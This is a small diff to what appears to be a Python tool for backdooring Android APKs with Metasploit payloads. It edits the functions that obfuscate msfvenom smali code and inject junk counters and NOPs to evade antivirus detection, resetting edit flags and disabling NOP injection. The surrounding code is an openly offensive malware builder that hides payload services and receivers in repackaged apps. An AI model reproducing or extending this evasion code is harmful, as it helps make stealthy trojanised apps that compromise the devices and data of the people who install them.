@@ -170,7 +170,9 @@ def injectcounters(filename):
                 new_smali += "    :cond_10\n"
                 new_smali += "    add-int/lit8 v6, v6, 0x1\n"
                 new_smali += "    goto :goto_9\n"
-                new_smali += line 
+                new_smali += line
+            edit_method = False
+            edit=False     
         else:
             new_smali += line
 
@@ -323,7 +325,7 @@ def smali_evasion(directory,apktobackdoor):
         for filename in filter(lambda x: x.endswith(".smali"), filenames):
             msfvenom_smali_obfuscator(os.path.join(dirpath, filename),metaspl,stage,Pay,MainActivity,MainService,MainBroadcastReceiver)
             injectcounters(os.path.join(dirpath, filename))
-            injectnops(os.path.join(dirpath, filename))
+            #injectnops(os.path.join(dirpath, filename))
 
     if apktobackdoor != "No":
 
